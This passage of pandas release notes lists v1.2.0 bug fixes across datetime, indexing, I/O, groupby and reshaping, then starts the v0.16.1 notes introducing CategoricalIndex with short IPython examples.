:meth:`Series.searchsorted` with ``datetime64``, ``timedelta64`` or :class:`Period` dtype placement of ``NaT`` values being inconsistent with NumPy (:issue:`36176`, :issue:`36254`)\n- Inconsistency in :class:`.DatetimeArray`, :class:`.TimedeltaArray`, and :class:`.PeriodArray` method ``__setitem__`` casting arrays of strings to datetime-like scalars but not scalar strings (:issue:`36261`)\n- Bug in :meth:`.DatetimeArray.take` incorrectly allowing ``fill_value`` with a mismatched time zone (:issue:`37356`)\n- Bug in :class:`.DatetimeIndex.shift` incorrectly raising when shifting empty indexes (:issue:`14811`)\n- :class:`Timestamp` and :class:`.DatetimeIndex` comparisons between tz-aware and tz-naive objects now follow the standard library ``datetime`` behavior, returning ``True``/``False`` for ``!=``/``==`` and raising for inequality comparisons (:issue:`28507`)\n- Bug in :meth:`.DatetimeIndex.equals` and :meth:`.TimedeltaIndex.equals` incorrectly considering ``int64`` indexes as equal (:issue:`36744`)\n- :meth:`Series.to_json`, :meth:`DataFrame.to_json`, and :meth:`read_json` now implement time zone parsing when orient structure is ``table`` (:issue:`35973`)\n- :meth:`astype` now attempts to convert to ``datetime64[ns, tz]`` directly from ``object`` with inferred time zone from string (:issue:`35973`)\n- Bug in :meth:`.TimedeltaIndex.sum` and :meth:`Series.sum` with ``timedelta64`` dtype on an empty index or series returning ``NaT`` instead of ``Timedelta(0)`` (:issue:`31751`)\n- Bug in :meth:`.DatetimeArray.shift` incorrectly allowing ``fill_value`` with a mismatched time zone (:issue:`37299`)\n- Bug in adding a :class:`.BusinessDay` with nonzero ``offset`` to a non-scalar other (:issue:`37457`)\n- Bug in :func:`to_datetime` with a read-only array incorrectly raising (:issue:`34857`)\n- Bug in :meth:`Series.isin` with ``datetime64[ns]`` dtype and :meth:`.DatetimeIndex.isin` incorrectly casting integers to datetimes (:issue:`36621`)\n- Bug in :meth:`Series.isin` with ``datetime64[ns]`` dtype and :meth:`.DatetimeIndex.isin` failing to consider tz-aware and tz-naive datetimes as always different (:issue:`35728`)\n- Bug in :meth:`Series.isin` with ``PeriodDtype`` dtype and :meth:`PeriodIndex.isin` failing to consider arguments with different ``PeriodDtype`` as always different (:issue:`37528`)\n- Bug in :class:`Period` constructor now correctly handles nanoseconds in the ``value`` argument (:issue:`34621` and :issue:`17053`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`.TimedeltaIndex`, :class:`Series`, and :class:`DataFrame` floor-division with ``timedelta64`` dtypes and ``NaT`` in the denominator (:issue:`35529`)\n- Bug in parsing of ISO 8601 durations in :class:`Timedelta` and :func:`to_datetime` (:issue:`29773`, :issue:`36204`)\n- Bug in :func:`to_timedelta` with a read-only array incorrectly raising (:issue:`34857`)\n- Bug in :class:`Timedelta` incorrectly truncating to sub-second portion of a string input when it has precision higher than nanoseconds (:issue:`36738`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :func:`date_range` was raising ``AmbiguousTimeError`` for valid input with ``ambiguous=False`` (:issue:`35297`)\n- Bug in :meth:`Timestamp.replace` was losing fold information (:issue:`37610`)\n\n\nNumeric\n^^^^^^^\n- Bug in :func:`to_numeric` where float precision was incorrect (:issue:`31364`)\n- Bug in :meth:`DataFrame.any` with ``axis=1`` and ``bool_only=True`` ignoring the ``bool_only`` keyword (:issue:`32432`)\n- Bug in :meth:`Series.equals` where a ``ValueError`` was raised when NumPy arrays were compared to scalars (:issue:`35267`)\n- Bug in :class:`Series` where two Series each have a :class:`.DatetimeIndex` with different time zones having those indexes incorrectly changed when performing arithmetic operations (:issue:`33671`)\n- Bug in :mod:`pandas.testing` module functions when used with ``check_exact=False`` on complex numeric types (:issue:`28235`)\n- Bug in :meth:`DataFrame.__rmatmul__` error handling reporting transposed shapes (:issue:`21581`)\n- Bug in :class:`Series` flex arithmetic methods where the result when operating with a ``list``, ``tuple`` or ``np.ndarray`` would have an incorrect name (:issue:`36760`)\n- Bug in :class:`.IntegerArray` multiplication with ``timedelta`` and ``np.timedelta64`` objects (:issue:`36870`)\n- Bug in :class:`MultiIndex` comparison with tuple incorrectly treating tuple as array-like (:issue:`21517`)\n- Bug in :meth:`DataFrame.diff` with ``datetime64`` dtypes including ``NaT`` values failing to fill ``NaT`` results correctly (:issue:`32441`)\n- Bug in :class:`DataFrame` arithmetic ops incorrectly accepting keyword arguments (:issue:`36843`)\n- Bug in :class:`.IntervalArray` comparisons with :class:`Series` not returning Series (:issue:`36908`)\n- Bug in :class:`DataFrame` allowing arithmetic operations with list of array-likes with undefined results. Behavior changed to raising ``ValueError`` (:issue:`36702`)\n- Bug in :meth:`DataFrame.std` with ``timedelta64`` dtype and ``skipna=False`` (:issue:`37392`)\n- Bug in :meth:`DataFrame.min` and :meth:`DataFrame.max` with ``datetime64`` dtype and ``skipna=False`` (:issue:`36907`)\n- Bug in :meth:`DataFrame.idxmax` and :meth:`DataFrame.idxmin` with mixed dtypes incorrectly raising ``TypeError`` (:issue:`38195`)\n\nConversion\n^^^^^^^^^^\n\n- Bug in :meth:`DataFrame.to_dict` with ``orient='records'`` now returns python native datetime objects for datetime-like columns (:issue:`21256`)\n- Bug in :meth:`Series.astype` conversion from ``string`` to ``float`` raised in presence of ``pd.NA`` values (:issue:`37626`)\n\nStrings\n^^^^^^^\n- Bug in :meth:`Series.to_string`, :meth:`DataFrame.to_string`, and :meth:`DataFrame.to_latex` adding a leading space when ``index=False`` (:issue:`24980`)\n- Bug in :func:`to_numeric` raising a ``TypeError`` when attempting to convert a string dtype Series containing only numeric strings and ``NA`` (:issue:`37262`)\n\nInterval\n^^^^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` where :class:`Interval` dtypes would be converted to object dtypes (:issue:`34871`)\n- Bug in :meth:`IntervalIndex.take` with negative indices and ``fill_value=None`` (:issue:`37330`)\n- Bug in :meth:`IntervalIndex.putmask` with datetime-like dtype incorrectly casting to object dtype (:issue:`37968`)\n- Bug in :meth:`IntervalArray.astype` incorrectly dropping dtype information with a :class:`CategoricalDtype` object (:issue:`37984`)\n\nIndexing\n^^^^^^^^\n\n- Bug in :meth:`PeriodIndex.get_loc` incorrectly raising ``ValueError`` on non-datelike strings instead of ``KeyError``, causing similar errors in :meth:`Series.__getitem__`, :meth:`Series.__contains__`, and :meth:`Series.loc.__getitem__` (:issue:`34240`)\n- Bug in :meth:`Index.sort_values` where, when empty values were passed, the method would break by trying to compare missing values instead of pushing them to the end of the sort order (:issue:`35584`)\n- Bug in :meth:`Index.get_indexer` and :meth:`Index.get_indexer_non_unique` where ``int64`` arrays are returned instead of ``intp`` (:issue:`36359`)\n- Bug in :meth:`DataFrame.sort_index` where parameter ascending passed as a list on a single level index gives wrong result (:issue:`32334`)\n- Bug in :meth:`DataFrame.reset_index` was incorrectly raising a ``ValueError`` for input with a :class:`MultiIndex` with missing values in a level with ``Categorical`` dtype (:issue:`24206`)\n- Bug in indexing with boolean masks on datetime-like values sometimes returning a view instead of a copy (:issue:`36210`)\n- Bug in :meth:`DataFrame.__getitem__` and :meth:`DataFrame.loc.__getitem__` with :class:`IntervalIndex` columns and a numeric indexer (:issue:`26490`)\n- Bug in :meth:`Series.loc.__getitem__` with a non-unique :class:`MultiIndex` and an empty-list indexer (:issue:`13691`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`MultiIndex` and a level named ``\"0\"`` (:issue:`37194`)\n- Bug in :meth:`Series.__getitem__` when using an unsigned integer array as an indexer giving incorrect results or segfaulting instead of raising ``KeyError`` (:issue:`37218`)\n- Bug in :meth:`Index.where` incorrectly casting numeric values to strings (:issue:`37591`)\n- Bug in :meth:`DataFrame.loc` returning empty result when indexer is a slice with negative step size (:issue:`38071`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` raises when the index was of ``object`` dtype and the given numeric label was in the index (:issue:`26491`)\n- Bug in :meth:`DataFrame.loc` returned requested key plus missing values when ``loc`` was applied to single level from a :class:`MultiIndex` (:issue:`27104`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`CategoricalIndex` using a list-like indexer containing NA values (:issue:`37722`)\n- Bug in :meth:`DataFrame.loc.__setitem__` expanding an empty :class:`DataFrame` with mixed dtypes (:issue:`37932`)\n- Bug in :meth:`DataFrame.xs` ignored ``droplevel=False`` for columns (:issue:`19056`)\n- Bug in :meth:`DataFrame.reindex` raising ``IndexingError`` wrongly for empty DataFrame with ``tolerance`` not ``None`` or ``method=\"nearest\"`` (:issue:`27315`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`CategoricalIndex` using list-like indexer that contains elements that are in the index's ``categories`` but not in the index itself failing to raise ``KeyError`` (:issue:`37901`)\n- Bug on inserting a boolean label into a :class:`DataFrame` with a numeric :class:`Index` columns incorrectly casting to integer (:issue:`36319`)\n- Bug in :meth:`DataFrame.iloc` and :meth:`Series.iloc` aligning objects in ``__setitem__`` (:issue:`22046`)\n- Bug in :meth:`MultiIndex.drop` does not raise if labels are partially found (:issue:`37820`)\n- Bug in :meth:`DataFrame.loc` did not raise ``KeyError`` when missing combination was given with ``slice(None)`` for remaining levels (:issue:`19556`)\n- Bug in :meth:`DataFrame.loc` raising ``TypeError`` when non-integer slice was given to select values from :class:`MultiIndex` (:issue:`25165`, :issue:`24263`)\n- Bug in :meth:`Series.at` returning :class:`Series` with one element instead of scalar when index is a :class:`MultiIndex` with one level (:issue:`38053`)\n- Bug in :meth:`DataFrame.loc` returning and assigning elements in wrong order when indexer is differently ordered than the :class:`MultiIndex` to filter (:issue:`31330`, :issue:`34603`)\n- Bug in :meth:`DataFrame.loc` and :meth:`DataFrame.__getitem__`  raising ``KeyError`` when columns were :class:`MultiIndex` with only one level (:issue:`29749`)\n- Bug in :meth:`Series.__getitem__` and :meth:`DataFrame.__getitem__` raising blank ``KeyError`` without missing keys for :class:`IntervalIndex` (:issue:`27365`)\n- Bug in setting a new label on a :class:`DataFrame` or :class:`Series` with a :class:`CategoricalIndex` incorrectly raising ``TypeError`` when the new label is not among the index's categories (:issue:`38098`)\n- Bug in :meth:`Series.loc` and :meth:`Series.iloc` raising ``ValueError`` when inserting a list-like ``np.array``, ``list`` or ``tuple`` in an ``object`` Series of equal length (:issue:`37748`, :issue:`37486`)\n- Bug in :meth:`Series.loc` and :meth:`Series.iloc` setting all the values of an ``object`` Series with those of a list-like ``ExtensionArray`` instead of inserting it (:issue:`38271`)\n\nMissing\n^^^^^^^\n\n- Bug in :meth:`.SeriesGroupBy.transform` now correctly handles missing values for ``dropna=False`` (:issue:`35014`)\n- Bug in :meth:`Series.nunique` with ``dropna=True`` was returning incorrect results when both ``NA`` and ``None`` missing values were present (:issue:`37566`)\n- Bug in :meth:`Series.interpolate` where kwarg ``limit_area`` and ``limit_direction`` had no effect when using methods ``pad`` and ``backfill`` (:issue:`31048`)\n\nMultiIndex\n^^^^^^^^^^\n\n- Bug in :meth:`DataFrame.xs` when used with :class:`IndexSlice` raises ``TypeError`` with message ``\"Expected label or tuple of labels\"`` (:issue:`35301`)\n- Bug in :meth:`DataFrame.reset_index` with ``NaT`` values in index raises ``ValueError`` with message ``\"cannot convert float NaN to integer\"`` (:issue:`36541`)\n- Bug in :meth:`DataFrame.combine_first` when used with :class:`MultiIndex` containing string and ``NaN`` values raises ``TypeError`` (:issue:`36562`)\n- Bug in :meth:`MultiIndex.drop` dropped ``NaN`` values when non existing key was given as input (:issue:`18853`)\n- Bug in :meth:`MultiIndex.drop` dropping more values than expected when index has duplicates and is not sorted (:issue:`33494`)\n\nI/O\n^^^\n\n- :func:`read_sas` no longer leaks resources on failure (:issue:`35566`)\n- Bug in :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` caused a ``ValueError`` when it was called with a filename in combination with ``mode`` containing a ``b`` (:issue:`35058`)\n- Bug in :meth:`read_csv` with ``float_precision='round_trip'`` did not handle ``decimal`` and ``thousands`` parameters (:issue:`35365`)\n- :meth:`to_pickle` and :meth:`read_pickle` were closing user-provided file objects (:issue:`35679`)\n- :meth:`to_csv` passes compression arguments for ``'gzip'`` always to ``gzip.GzipFile`` (:issue:`28103`)\n- :meth:`to_csv` did not support zip compression for binary file object not having a filename (:issue:`35058`)\n- :meth:`to_csv` and :meth:`read_csv` did not honor ``compression`` and ``encoding`` for path-like objects that are internally converted to file-like objects (:issue:`35677`, :issue:`26124`, :issue:`32392`)\n- :meth:`DataFrame.to_pickle`, :meth:`Series.to_pickle`, and :meth:`read_pickle` did not support compression for file-objects (:issue:`26237`, :issue:`29054`, :issue:`29570`)\n- Bug in :func:`LongTableBuilder.middle_separator` was duplicating LaTeX longtable entries in the List of Tables of a LaTeX document (:issue:`34360`)\n- Bug in :meth:`read_csv` with ``engine='python'`` truncating data if multiple items present in first row and first element started with BOM (:issue:`36343`)\n- Removed ``private_key`` and ``verbose`` from :func:`read_gbq` as they are no longer supported in ``pandas-gbq`` (:issue:`34654`, :issue:`30200`)\n- Bumped minimum pytables version to 3.5.1 to avoid a ``ValueError`` in :meth:`read_hdf` (:issue:`24839`)\n- Bug in :func:`read_table` and :func:`read_csv` when ``delim_whitespace=True`` and ``sep=default`` (:issue:`36583`)\n- Bug in :meth:`DataFrame.to_json` and :meth:`Series.to_json` when used with ``lines=True`` and ``orient='records'`` the last line of the record is not appended with 'new line character' (:issue:`36888`)\n- Bug in :meth:`read_parquet` with fixed offset time zones. String representation of time zones was not recognized (:issue:`35997`, :issue:`36004`)\n- Bug in :meth:`DataFrame.to_html`, :meth:`DataFrame.to_string`, and :meth:`DataFrame.to_latex` ignoring the ``na_rep`` argument when ``float_format`` was also specified (:issue:`9046`, :issue:`13828`)\n- Bug in output rendering of complex numbers showing too many trailing zeros (:issue:`36799`)\n- Bug in :class:`HDFStore` threw a ``TypeError`` when exporting an empty DataFrame with ``datetime64[ns, tz]`` dtypes with a fixed HDF5 store (:issue:`20594`)\n- Bug in :class:`HDFStore` was dropping time zone information when exporting a Series with ``datetime64[ns, tz]`` dtypes with a fixed HDF5 store (:issue:`20594`)\n- :func:`read_csv` was closing user-provided binary file handles when ``engine=\"c\"`` and an ``encoding`` was requested (:issue:`36980`)\n- Bug in :meth:`DataFrame.to_hdf` was not dropping missing rows with ``dropna=True`` (:issue:`35719`)\n- Bug in :func:`read_html` was raising a ``TypeError`` when supplying a ``pathlib.Path`` argument to the ``io`` parameter (:issue:`37705`)\n- :meth:`DataFrame.to_excel`, :meth:`Series.to_excel`, :meth:`DataFrame.to_markdown`, and :meth:`Series.to_markdown` now support writing to fsspec URLs such as S3 and Google Cloud Storage (:issue:`33987`)\n- Bug in :func:`read_fwf` with ``skip_blank_lines=True`` was not skipping blank lines (:issue:`37758`)\n- Parse missing values using :func:`read_json` with ``dtype=False`` to ``NaN`` instead of ``None`` (:issue:`28501`)\n- :meth:`read_fwf` was inferring compression with ``compression=None`` which was not consistent with the other ``read_*`` functions (:issue:`37909`)\n- :meth:`DataFrame.to_html` was ignoring ``formatters`` argument for ``ExtensionDtype`` columns (:issue:`36525`)\n- Bumped minimum xarray version to 0.12.3 to avoid reference to the removed ``Panel`` class (:issue:`27101`, :issue:`37983`)\n- :meth:`DataFrame.to_csv` was re-opening file-like handles that also implement ``os.PathLike`` (:issue:`38125`)\n- Bug in the conversion of a sliced ``pyarrow.Table`` with missing values to a DataFrame (:issue:`38525`)\n- Bug in :func:`read_sql_table` raising a ``sqlalchemy.exc.OperationalError`` when column names contained a percentage sign (:issue:`37517`)\n\nPeriod\n^^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` where :class:`Period` dtypes would be converted to object dtypes (:issue:`34871`)\n\nPlotting\n^^^^^^^^\n\n- Bug in :meth:`DataFrame.plot` was rotating xticklabels when ``subplots=True``, even if the x-axis wasn't an irregular time series (:issue:`29460`)\n- Bug in :meth:`DataFrame.plot` where a marker letter in the ``style`` keyword sometimes caused a ``ValueError`` (:issue:`21003`)\n- Bug in :meth:`DataFrame.plot.bar` and :meth:`Series.plot.bar` where ticks positions were assigned by value order instead of using the actual value for numeric or a smart ordering for string (:issue:`26186`, :issue:`11465`). This fix has been reverted in pandas 1.2.1, see :doc:`v1.2.1`\n- Twinned axes were losing their tick labels which should only happen to all but the last row or column of 'externally' shared axes (:issue:`33819`)\n- Bug in :meth:`Series.plot` and :meth:`DataFrame.plot` was throwing a :exc:`ValueError` when the Series or DataFrame was\n  indexed by a :class:`.TimedeltaIndex` with a fixed frequency and the x-axis lower limit was greater than the upper limit (:issue:`37454`)\n- Bug in :meth:`.DataFrameGroupBy.boxplot` when ``subplots=False`` would raise a ``KeyError`` (:issue:`16748`)\n- Bug in :meth:`DataFrame.plot` and :meth:`Series.plot` was overwriting matplotlib's shared y axes behavior when no ``sharey`` parameter was passed (:issue:`37942`)\n- Bug in :meth:`DataFrame.plot` was raising a ``TypeError`` with ``ExtensionDtype`` columns (:issue:`32073`)\n\nStyler\n^^^^^^\n\n- Bug in :meth:`Styler.render` HTML was generated incorrectly because of formatting error in ``rowspan`` attribute, it now matches with w3 syntax (:issue:`38234`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :meth:`.DataFrameGroupBy.count` and :meth:`SeriesGroupBy.sum` returning ``NaN`` for missing categories when grouped on multiple ``Categoricals``. Now returning ``0`` (:issue:`35028`)\n- Bug in :meth:`.DataFrameGroupBy.apply` that would sometimes throw an erroneous ``ValueError`` if the grouping axis had duplicate entries (:issue:`16646`)\n- Bug in :meth:`DataFrame.resample` that would throw a ``ValueError`` when resampling from ``\"D\"`` to ``\"24H\"`` over a transition into daylight savings time (DST) (:issue:`35219`)\n- Bug when combining methods :meth:`DataFrame.groupby` with :meth:`DataFrame.resample` and :meth:`DataFrame.interpolate` raising a ``TypeError`` (:issue:`35325`)\n- Bug in :meth:`.DataFrameGroupBy.apply` where a non-nuisance grouping column would be dropped from the output columns if another groupby method was called before ``.apply`` (:issue:`34656`)\n- Bug when subsetting columns on a :class:`.DataFrameGroupBy` (e.g. ``df.groupby('a')[['b']])``) would reset the attributes ``axis``, ``dropna``, ``group_keys``, ``level``, ``mutated``, ``sort``, and ``squeeze`` to their default values (:issue:`9959`)\n- Bug in :meth:`.DataFrameGroupBy.tshift` failing to raise ``ValueError`` when a frequency cannot be inferred for the index of a group (:issue:`35937`)\n- Bug in :meth:`DataFrame.groupby` does not always maintain column index name for ``any``, ``all``, ``bfill``, ``ffill``, ``shift`` (:issue:`29764`)\n- Bug in :meth:`.DataFrameGroupBy.apply` raising error with ``np.nan`` group(s) when ``dropna=False`` (:issue:`35889`)\n- Bug in :meth:`.Rolling.sum` returned wrong values when dtypes where mixed between float and integer and ``axis=1`` (:issue:`20649`, :issue:`35596`)\n- Bug in :meth:`.Rolling.count` returned ``np.nan`` with :class:`~pandas.api.indexers.FixedForwardWindowIndexer` as window, ``min_periods=0`` and only missing values in the window (:issue:`35579`)\n- Bug where :class:`.Rolling` produces incorrect window sizes when using a ``PeriodIndex`` (:issue:`34225`)\n- Bug in :meth:`.DataFrameGroupBy.ffill` and :meth:`.DataFrameGroupBy.bfill` where a ``NaN`` group would return filled values instead of ``NaN`` when ``dropna=True`` (:issue:`34725`)\n- Bug in :meth:`.RollingGroupby.count` where a ``ValueError`` was raised when specifying the ``closed`` parameter (:issue:`35869`)\n- Bug in :meth:`.DataFrameGroupBy.rolling` returning wrong values with partial centered window (:issue:`36040`)\n- Bug in :meth:`.DataFrameGroupBy.rolling` returned wrong values with time aware window containing ``NaN``. Raises ``ValueError`` because windows are not monotonic now (:issue:`34617`)\n- Bug in :meth:`.Rolling.__iter__` where a ``ValueError`` was not raised when ``min_periods`` was larger than ``window`` (:issue:`37156`)\n- Using :meth:`.Rolling.var` instead of :meth:`.Rolling.std` avoids numerical issues for :meth:`.Rolling.corr` when :meth:`.Rolling.var` is still within floating point precision while :meth:`.Rolling.std` is not (:issue:`31286`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.Resampler.quantile` raised ``TypeError`` when values were of type ``Timedelta`` (:issue:`29485`)\n- Bug in :meth:`.Rolling.median` and :meth:`.Rolling.quantile` returned wrong values for :class:`.BaseIndexer` subclasses with non-monotonic starting or ending points for windows (:issue:`37153`)\n- Bug in :meth:`DataFrame.groupby` dropped ``nan`` groups from result with ``dropna=False`` when grouping over a single column (:issue:`35646`, :issue:`35542`)\n- Bug in :meth:`.DataFrameGroupBy.head`, :meth:`DataFrameGroupBy.tail`, :meth:`SeriesGroupBy.head`, and :meth:`SeriesGroupBy.tail` would raise when used with ``axis=1`` (:issue:`9772`)\n- Bug in :meth:`.DataFrameGroupBy.transform` would raise when used with ``axis=1`` and a transformation kernel (e.g. \"shift\") (:issue:`36308`)\n- Bug in :meth:`.DataFrameGroupBy.resample` using ``.agg`` with sum produced different result than just calling ``.sum`` (:issue:`33548`)\n- Bug in :meth:`.DataFrameGroupBy.apply` dropped values on ``nan`` group when returning the same axes with the original frame (:issue:`38227`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` couldn't handle with arraylike ``q`` when grouping by columns (:issue:`33795`)\n- Bug in :meth:`DataFrameGroupBy.rank` with ``datetime64tz`` or period dtype incorrectly casting results to those dtypes instead of returning ``float64`` dtype (:issue:`38187`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in :meth:`DataFrame.crosstab` was returning incorrect results on inputs with duplicate row names, duplicate column names or duplicate names between row and column labels (:issue:`22529`)\n- Bug in :meth:`DataFrame.pivot_table` with ``aggfunc='count'`` or ``aggfunc='sum'`` returning ``NaN`` for missing categories when pivoted on a ``Categorical``. Now returning ``0`` (:issue:`31422`)\n- Bug in :func:`concat` and :class:`DataFrame` constructor where input index names are not preserved in some cases (:issue:`13475`)\n- Bug in func :meth:`crosstab` when using multiple columns with ``margins=True`` and ``normalize=True`` (:issue:`35144`)\n- Bug in :meth:`DataFrame.stack` where an empty DataFrame.stack would raise an error (:issue:`36113`). Now returning an empty Series with empty MultiIndex.\n- Bug in :meth:`Series.unstack`. Now a Series with single level of Index trying to unstack would raise a ``ValueError`` (:issue:`36113`)\n- Bug in :meth:`DataFrame.agg` with ``func={'name':<FUNC>}`` incorrectly raising ``TypeError`` when ``DataFrame.columns==['Name']`` (:issue:`36212`)\n- Bug in :meth:`Series.transform` would give incorrect results or raise when the argument ``func`` was a dictionary (:issue:`35811`)\n- Bug in :meth:`DataFrame.pivot` did not preserve :class:`MultiIndex` level names for columns when rows and columns are both multiindexed (:issue:`36360`)\n- Bug in :meth:`DataFrame.pivot` modified ``index`` argument when ``columns`` was passed but ``values`` was not (:issue:`37635`)\n- Bug in :meth:`DataFrame.join` returned a non deterministic level-order for the resulting :class:`MultiIndex` (:issue:`36910`)\n- Bug in :meth:`DataFrame.combine_first` caused wrong alignment with dtype ``string`` and one level of ``MultiIndex`` containing only ``NA`` (:issue:`37591`)\n- Fixed regression in :func:`merge` on merging :class:`.DatetimeIndex` with empty DataFrame (:issue:`36895`)\n- Bug in :meth:`DataFrame.apply` not setting index of return value when ``func`` return type is ``dict`` (:issue:`37544`)\n- Bug in :meth:`DataFrame.merge` and :meth:`pandas.merge` returning inconsistent ordering in result for ``how=right`` and ``how=left`` (:issue:`35382`)\n- Bug in :func:`merge_ordered` couldn't handle list-like ``left_by`` or ``right_by`` (:issue:`35269`)\n- Bug in :func:`merge_ordered` returned wrong join result when length of ``left_by`` or ``right_by`` equals to the rows of ``left`` or ``right`` (:issue:`38166`)\n- Bug in :func:`merge_ordered` didn't raise when elements in ``left_by`` or ``right_by`` not exist in ``left`` columns or ``right`` columns (:issue:`38167`)\n- Bug in :func:`DataFrame.drop_duplicates` not validating bool dtype for ``ignore_index`` keyword (:issue:`38274`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Fixed bug where :class:`DataFrame` column set to scalar extension type via a dict instantiation was considered an object type rather than the extension type (:issue:`35965`)\n- Fixed bug where ``astype()`` with equal dtype and ``copy=False`` would return a new object (:issue:`28488`)\n- Fixed bug when applying a NumPy ufunc with multiple outputs to an :class:`.IntegerArray` returning ``None`` (:issue:`36913`)\n- Fixed an inconsistency in :class:`.PeriodArray`'s ``__init__`` signature to those of :class:`.DatetimeArray` and :class:`.TimedeltaArray` (:issue:`37289`)\n- Reductions for :class:`.BooleanArray`, :class:`.Categorical`, :class:`.DatetimeArray`, :class:`.FloatingArray`, :class:`.IntegerArray`, :class:`.PeriodArray`, :class:`.TimedeltaArray`, and :class:`.PandasArray` are now keyword-only methods (:issue:`37541`)\n- Fixed a bug where a  ``TypeError`` was wrongly raised if a membership check was made on an ``ExtensionArray`` containing nan-like values (:issue:`37867`)\n\nOther\n^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` incorrectly raising an ``AssertionError`` instead of a ``ValueError`` when invalid parameter combinations are passed (:issue:`36045`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` with numeric values and string ``to_replace`` (:issue:`34789`)\n- Fixed metadata propagation in :meth:`Series.abs` and ufuncs called on Series and DataFrames (:issue:`28283`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` incorrectly casting from ``PeriodDtype`` to object dtype (:issue:`34871`)\n- Fixed bug in metadata propagation incorrectly copying DataFrame columns as metadata when the column name overlaps with the metadata name (:issue:`37037`)\n- Fixed metadata propagation in the :class:`Series.dt`, :class:`Series.str` accessors, :class:`DataFrame.duplicated`, :class:`DataFrame.stack`, :class:`DataFrame.unstack`, :class:`DataFrame.pivot`, :class:`DataFrame.append`, :class:`DataFrame.diff`, :class:`DataFrame.applymap` and :class:`DataFrame.update` methods (:issue:`28283`, :issue:`37381`)\n- Fixed metadata propagation when selecting columns with ``DataFrame.__getitem__`` (:issue:`28283`)\n- Bug in :meth:`Index.intersection` with non-:class:`Index` failing to set the correct name on the returned :class:`Index` (:issue:`38111`)\n- Bug in :meth:`RangeIndex.intersection` failing to set the correct name on the returned :class:`Index` in some corner cases (:issue:`38197`)\n- Bug in :meth:`Index.difference` failing to set the correct name on the returned :class:`Index` in some corner cases (:issue:`38268`)\n- Bug in :meth:`Index.union` behaving differently depending on whether operand is an :class:`Index` or other list-like (:issue:`36384`)\n- Bug in :meth:`Index.intersection` with non-matching numeric dtypes casting to ``object`` dtype instead of minimal common dtype (:issue:`38122`)\n- Bug in :meth:`IntervalIndex.union` returning an incorrectly-typed :class:`Index` when empty (:issue:`38282`)\n- Passing an array with 2 or more dimensions to the :class:`Series` constructor now raises the more specific ``ValueError`` rather than a bare ``Exception`` (:issue:`35744`)\n- Bug in ``dir`` where ``dir(obj)`` wouldn't show attributes defined on the instance for pandas objects (:issue:`37173`)\n- Bug in :meth:`Index.drop` raising ``InvalidIndexError`` when index has duplicates (:issue:`38051`)\n- Bug in :meth:`RangeIndex.difference` returning :class:`Int64Index` in some cases where it should return :class:`RangeIndex` (:issue:`38028`)\n- Fixed bug in :func:`assert_series_equal` when comparing a datetime-like array with an equivalent non extension dtype array (:issue:`37609`)\n- Bug in :func:`.is_bool_dtype` would raise when passed a valid string such as ``\"boolean\"`` (:issue:`38386`)\n- Fixed regression in logical operators raising ``ValueError`` when columns of :class:`DataFrame` are a :class:`CategoricalIndex` with unused categories (:issue:`38367`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.5..v1.2.0\n\n\n.. _whatsnew_0161:\n\nVersion 0.16.1 (May 11, 2015)\n-----------------------------\n\n{{ header }}\n\n\nThis is a minor bug-fix release from 0.16.0 and includes a large number of\nbug fixes along several new features, enhancements, and performance improvements.\nWe recommend that all users upgrade to this version.\n\nHighlights include:\n\n- Support for a ``CategoricalIndex``, a category based index, see :ref:`here <whatsnew_0161.enhancements.categoricalindex>`\n- New section on how-to-contribute to *pandas*, see :ref:`here <contributing>`\n- Revised \"Merge, join, and concatenate\" documentation, including graphical examples to make it easier to understand each operations, see :ref:`here <merging>`\n- New method ``sample`` for drawing random samples from Series, DataFrames and Panels. See :ref:`here <whatsnew_0161.enhancements.sample>`\n- The default ``Index`` printing has changed to a more uniform format, see :ref:`here <whatsnew_0161.index_repr>`\n- ``BusinessHour`` datetime-offset is now supported, see :ref:`here <timeseries.businesshour>`\n\n-  Further enhancement to the ``.str`` accessor to make string operations easier, see :ref:`here <whatsnew_0161.enhancements.string>`\n\n.. contents:: What's new in v0.16.1\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0161.enhancements:\n\n.. warning::\n\n   In pandas 0.17.0, the sub-package ``pandas.io.data`` will be removed in favor of a separately installable package (:issue:`8961`).\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_0161.enhancements.categoricalindex:\n\nCategoricalIndex\n^^^^^^^^^^^^^^^^\n\nWe introduce a ``CategoricalIndex``, a new type of index object that is useful for supporting\nindexing with duplicates. This is a container around a ``Categorical`` (introduced in v0.15.0)\nand allows efficient indexing and storage of an index with a large number of duplicated elements. Prior to 0.16.1,\nsetting the index of a ``DataFrame/Series`` with a ``category`` dtype would convert this to regular object-based ``Index``.\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({'A': np.arange(6),\n       ...:                    'B': pd.Series(list('aabbca'))\n       ...:                           .astype('category', categories=list('cab'))\n       ...:                    })\n       ...:\n\n    In [2]: df\n    Out[2]:\n       A  B\n    0  0  a\n    1  1  a\n    2  2  b\n    3  3  b\n    4  4  c\n    5  5  a\n\n    In [3]: df.dtypes\n    Out[3]:\n    A       int64\n    B    category\n    dtype: object\n\n    In [4]: df.B.cat.categories\n    Out[4]: Index(['c', 'a', 'b'], dtype='object')\n\n\nsetting the index, will create a ``CategoricalIndex``\n\n.. code-block:: ipython\n\n    In [5]: df2 = df.set_index('B')\n\n    In [6]: df2.index\n    